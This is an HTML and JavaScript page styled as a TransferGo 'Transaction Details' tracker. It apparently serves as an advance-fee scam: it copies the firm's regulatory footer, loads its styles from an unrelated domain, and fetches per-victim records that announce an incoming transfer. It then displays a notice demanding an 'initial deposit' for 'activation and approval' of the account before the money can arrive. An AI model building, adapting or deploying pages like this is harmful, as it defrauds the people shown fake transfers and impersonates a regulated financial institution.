<!DOCTYPE html>
<html lang='en'>
<head>
    <link rel='stylesheet' href='admin-style.css'>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>Transaction Details</title>
    <link rel='stylesheet' type='text/css' href='https://app.skyexpressglobal.com/wiretraff.click/style.css'>
    <link rel='stylesheet' type='text/css' href='https://app.skyexpressglobal.com/style.css'>
    <link rel='stylesheet' type='text/css' href='page.css'>
    <script src="config.js"></script>
  <!-- Smartsupp Live Chat script -->
<script type="text/javascript">
var _smartsupp = _smartsupp || {};
_smartsupp.key = 'be97e4fe93d9602d82ff3b1a2be24078c64bb7ad';
window.smartsupp||(function(d) {
  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
  c.type='text/javascript';c.charset='utf-8';c.async=true;
  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
})(document);
</script>
<noscript> Powered by <a href=‚Äúhttps://www.smartsupp.com‚Äù target=‚Äú_blank‚Äù>Smartsupp</a></noscript>

</head>
<body>
<div class='dashboard'>
    
<div class='content'>
<div class='top'>
<div class='h3ad'>
<div class='logo'><img height='50' src='assets/img/logo-white.png'></div>
<div class='ri'>
<a class='msg' href=''></a>
<div><img class='flag' src='flagcdn.com/w320/ch.png' alt=''></div>
</div>
</div>
<br>                                                       
<div class='l1'>Hey,&ensp;<div class='recipient' id='recipientName'>Loading...</div></div>
<div class='l2'> <div class='r1'><div class='sender' style='color: #FFD000 !important;' id='senderName'>Loading...</div>&ensp;Is sending you</div>
<span id='amount'>Loading...</span></div> 


</div> 
<div class='nextl' style='margin-top:20px;'> 
<div class='m1'>
<div class='le'>
<div class='dot'></div>
<div id='transferInfo'>Loading transfer information...</div>
</div>
<div class='ri'><div class='btnn' id='datetime'>Loading...</div></div>
</div>

<div class='tp'>
<div class='le'>Transaction Progress</div>
<div class='ri' id='progress-text'>0%</div>
</div>

<div class='pcontainer'>
<div class='pin' id='progress-bar' style='width: 0%; transition: width 2s ease-in-out;'></div> 
</div>

<div class='message' id='loadingMessage'>
<div class='heading'>
<div class='le'>
<div class='dot blue'></div>
<div class='txt'>
<div class='txt1'>Loading Transaction Details</div>   
</div>
</div>
<div class='ri'>
<div class='btnn blue'>Loading</div></div>
</div>
<div class='txt2'>Please wait while we fetch your transaction information...</div>
</div>

<div class='message' id='feeMessage' style='display: none;'>
<div class='heading'>
<div class='le'>
<div class='dot gold'></div>
<div class='txt'>
<div class='txt1'>Transaction Fees</div>   
</div>
</div>
<div class='ri'>
<div class='btnn' id='feeStatus'>Processing</div></div>
</div>
<div class='txt2' id='feeText'>Loading fee information...</div>
</div>

<div class='message' id='statusMessage' style='display: none;'>
<div class='heading'>
<div class='le'>
<div class='dot' id='statusDot'></div>
<div class='txt'>
<div class='txt1' id='statusTitle'>Status Update</div>
</div>
</div>
<div class='ri'>
<div class='btnn' id='statusBadgeNew'>Processing</div></div>
</div>
<div class='txt2' id='statusText'>Loading status information...</div>
</div>

<div class='message' id='errorMessage' style='display: none;'>
<div class='heading'>
<div class='le'>
<div class='dot red'></div>
<div class='txt'>
<div class='txt1'>Error</div>
</div>
</div>
<div class='ri'>
<div class='btnn red'>Failed</div></div>
</div>
<div class='txt2' id='errorText'>Unable to load tracking information.</div>
</div>

</div> 
<div style='margin-top: 1.5rem;'>
<img src='visa.svg'>
</div>
<div class='fo'>
TransferGo is an authorised electronic money institution (EMI) authorized by the Financial Conduct Authority (FCA) under the Electronic Money regulations 2011 (EMRs) and the Payment Services Regulations 2017 (PSRs) (Firm registration number: 991295) to issue electronic money and providing payment services. Our registered office is 1a Old Street Yard, White Collar Factory, EC1Y 8AF, London, United Kingdom. <br>
<br>TransferGo Lithuania UAB is an electronic money institution established in the Republic of Lithuania, authorised and regulated by the Bank of Lithuania. Registered address: Palangos str. 4, Vilnius, Lithuania, number of registration 304871705, FI Code 32400. Our registered office is 1a Old Street Yard, White Collar Factory, EC1Y 8AF, London, United Kingdom.<br>
<br>
Copyright 2025 TransferGo Ltd
</div>

</div>

</div>

  <script>
    // Extract track ID from URL path
    function getTrackIdFromUrl() {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get('id');
    }

    // Cache for user data to avoid repeated requests
    let userDataCache = null;
    let lastFetchTime = 0;
    const CACHE_DURATION = 30000; // 30 seconds

    // Fetch user data by track ID with caching
    async function fetchUserByTrackId(trackId, forceRefresh = false) {
      const now = Date.now();

      // Return cached data if available and not expired
      if (!forceRefresh && userDataCache && (now - lastFetchTime) < CACHE_DURATION) {
        console.log('üóÇÔ∏è Using cached data for track ID:', trackId);
        return userDataCache;
      }

      try {
        // Check if config is loaded
        if (!window.EliteTrackConfig) {
          console.error('‚ùå EliteTrackConfig not loaded');
          throw new Error('Configuration not loaded. Please refresh the page.');
        }

        // Log environment information
        console.log('üåç Environment Info:', {
          hostname: window.location.hostname,
          pathname: window.location.pathname,
          origin: window.location.origin,
          userAgent: navigator.userAgent.substring(0, 50) + '...'
        });

        // Log the API URL being called
        const apiUrl = `${window.EliteTrackConfig.API_BASE_URL}/users/track/${trackId}`;
        console.log('üîç Fetching user data from:', apiUrl);
        console.log('üîß Track ID:', trackId);
        console.log('‚öôÔ∏è API Base URL:', window.EliteTrackConfig.API_BASE_URL);
        console.log('‚öôÔ∏è Current Time:', new Date().toISOString());

        // Add timeout for faster error handling
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 15000); // 15 second timeout

        const response = await fetch(apiUrl, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Cache-Control': 'no-cache'
          },
          signal: controller.signal
        });

        clearTimeout(timeoutId);

        console.log('üì° Response status:', response.status);
        console.log('üì° Response headers:', [...response.headers.entries()]);
        console.log('üì° Response URL:', response.url);

        // Handle different response statuses
        if (response.status === 404) {
          console.error('‚ùå Track ID not found:', trackId);
          return { error: `Track ID "${trackId}" not found. Please check the tracking link.` };
        }

        if (response.status === 500) {
          const errorText = await response.text();
          console.error('‚ùå Server Error Response:', errorText);
          return { error: 'Server error. Please try again later or contact support.' };
        }

        if (!response.ok) {
          const errorText = await response.text();
          console.error('‚ùå API Error Response:', errorText);
          throw new Error(`HTTP error! status: ${response.status}, body: ${errorText}`);
        }

        // Try to parse response
        const responseText = await response.text();
        console.log('üìÑ Raw response:', responseText);

        let data;
        try {
          data = JSON.parse(responseText);
        } catch (parseError) {
          console.error('‚ùå JSON Parse Error:', parseError);
          console.error('‚ùå Response text that failed to parse:', responseText);
          throw new Error('Invalid response format from server');
        }

        console.log('‚úÖ API Response:', data);

        // Check if user data exists
        if (!data.user) {
          console.error('‚ùå No user data in response:', data);
          
          // Check if there's an error message in the response
          if (data.error) {
            return { error: data.error };
          }
          
          throw new Error('User not found in API response');
        }

        // Cache the data
        userDataCache = data.user;
        lastFetchTime = now;

        console.log('‚úÖ User data cached successfully');
        return data.user;
      } catch (error) {
        if (error.name === 'AbortError') {
          console.error('‚ùå Request timed out');
          return { error: 'Request timed out. Please check your internet connection.' };
        }

        if (error.name === 'TypeError' && error.message.includes('fetch')) {
          console.error('‚ùå Network error');
          return { error: 'Network error. Please check your internet connection.' };
        }

        console.error('‚ùå Error fetching user data:', error);
        console.error('‚ùå Error stack:', error.stack);

        // Return error details for better debugging
        return {
          error: error.message,
          details: error.toString(),
          timestamp: new Date().toISOString()
        };
      }
    }

    // Update progress bar
    function updateProgressBar(percentage) {
      const progressBar = document.getElementById('progress-bar');
      const progressText = document.getElementById('progress-text');

      progressBar.style.width = `${percentage}%`;
      progressText.textContent = `${percentage}%`;

      // Add dynamic progress animation
      let currentProgress = parseInt(progressBar.style.width) || 0;
      if (currentProgress < percentage) {
        const animate = () => {
          if (currentProgress < percentage) {
            currentProgress++;
            progressBar.style.width = `${currentProgress}%`;
            progressText.textContent = `${currentProgress}%`;
            setTimeout(animate, 50);
          }
        };
        animate();
      }
    }

    // Show/hide message sections
    function showMessage(messageId, show = true) {
      const message = document.getElementById(messageId);
      if (message) {
        message.style.display = show ? 'block' : 'none';
      }
    }

    // Update message content
    function updateMessage(messageId, title, text, statusText, statusClass) {
      const message = document.getElementById(messageId);
      if (!message) return;

      const titleElement = message.querySelector('.txt1');
      const textElement = message.querySelector('.txt2');
      const statusElement = message.querySelector('.btnn');
      const dotElement = message.querySelector('.dot');

      if (titleElement) titleElement.textContent = title;
      if (textElement) textElement.textContent = text;
      if (statusElement) {
        statusElement.textContent = statusText;
        statusElement.className = `btnn ${statusClass}`;
      }
      if (dotElement) {
        dotElement.className = `dot ${statusClass}`;
      }
    }

    // Update the UI with user data
    function updateUserInterface(user) {
      if (!user || user.error) {
        showMessage('loadingMessage', false);
        updateMessage('errorMessage', 'Error', user ? user.error : 'Unable to load tracking information.', 'Failed', 'red');
        showMessage('errorMessage', true);
        return;
      }

      // Hide loading message
      showMessage('loadingMessage', false);

      // Update header information
      const recipientName = document.getElementById('recipientName');
      const senderName = document.getElementById('senderName');
      const amount = document.getElementById('amount');
      const transferInfo = document.getElementById('transferInfo');
      const datetime = document.getElementById('datetime');

      if (recipientName) recipientName.textContent = user.name || 'N/A';
      if (senderName) senderName.textContent = user.payment_to || 'Bank';
      if (amount) amount.textContent = user.money_due || user.amount || 'N/A';
      if (transferInfo) {
        transferInfo.innerHTML = `${user.payment_to || 'Bank'} made a transfer of ${user.money_due || user.amount || 'N/A'} to<br>${user.account_number || 'Account'}: ${user.track_id}`;
      }
      if (datetime) datetime.textContent = new Date().toISOString().slice(0, 16).replace('T', ' ');

      // Update progress
      updateProgressBar(user.progress_percentage || 0);

      // Show fee message if money is due
      if (user.money_due || user.status === 'pending') {
        updateMessage('feeMessage', 
          'Transaction Fees', 
          `This is to inform you that an initial deposit of ${user.money_due || 'Amount'} is required for the activation and approval of your account. Once completed, the transfer process can proceed smoothly.`,
          'Unresolved',
          'gold'
        );
        showMessage('feeMessage', true);
      }

      // Show status message
      if (user.message) {
        updateMessage('statusMessage', 
          'Status Update', 
          user.message,
          user.status || 'Processing',
          getStatusClass(user.status)
        );
        showMessage('statusMessage', true);
      }

      // Update document title
      document.title = `Transaction Details - ${user.name}`;
    }

    // Get CSS class for status
    function getStatusClass(status) {
      const statusMap = {
        'pending': 'gold',
        'processing': 'blue',
        'active': 'green',
        'completed': 'green',
        'failed': 'red'
      };
      return statusMap[status?.toLowerCase()] || 'blue';
    }

    // Button actions (kept for compatibility)
    function downloadReceipt() {
      alert('Not Available');
    }

    function proceedToPay() {
      alert('Contact support for more Information');
    }

    // Retry loading functionality
    async function retryLoading() {
      // Reset cache and reload
      userDataCache = null;
      lastFetchTime = 0;
      
      // Show loading message
      showMessage('errorMessage', false);
      showMessage('loadingMessage', true);
      
      try {
        await initializePage();
      } catch (error) {
        console.error('Retry failed:', error);
      }
    }

    // Initialize the page
    async function initializePage() {
      const trackId = getTrackIdFromUrl();

      if (!trackId) {
        showMessage('loadingMessage', false);
        updateMessage('errorMessage', 'Error', 'No tracking ID provided in the URL.', 'Failed', 'red');
        showMessage('errorMessage', true);
        return;
      }

      try {
        const userData = await fetchUserByTrackId(trackId);
        updateUserInterface(userData);
      } catch (error) {
        showMessage('loadingMessage', false);
        updateMessage('errorMessage', 'Error', 'Failed to load tracking information. Please try again.', 'Failed', 'red');
        showMessage('errorMessage', true);
      }
    }

    // Auto-refresh functionality
    let refreshInterval;
    function startAutoRefresh() {
      if (refreshInterval) {
        clearInterval(refreshInterval);
      }

      refreshInterval = setInterval(async () => {
        const trackId = getTrackIdFromUrl();
        if (trackId && document.visibilityState === 'visible') {
          try {
            const userData = await fetchUserByTrackId(trackId, false);
            if (userData) {
              updateUserInterface(userData);
            }
          } catch (error) {
            console.error('Auto-refresh failed:', error);
          }
        }
      }, 30000);
    }

    // Load user data when page loads
    document.addEventListener('DOMContentLoaded', () => {
      initializePage();
      startAutoRefresh();
    });

    // Pause auto-refresh when page is not visible
    document.addEventListener('visibilitychange', () => {
      if (document.visibilityState === 'visible') {
        startAutoRefresh();
      } else if (refreshInterval) {
        clearInterval(refreshInterval);
      }
    });
  </script>

</body>

</html>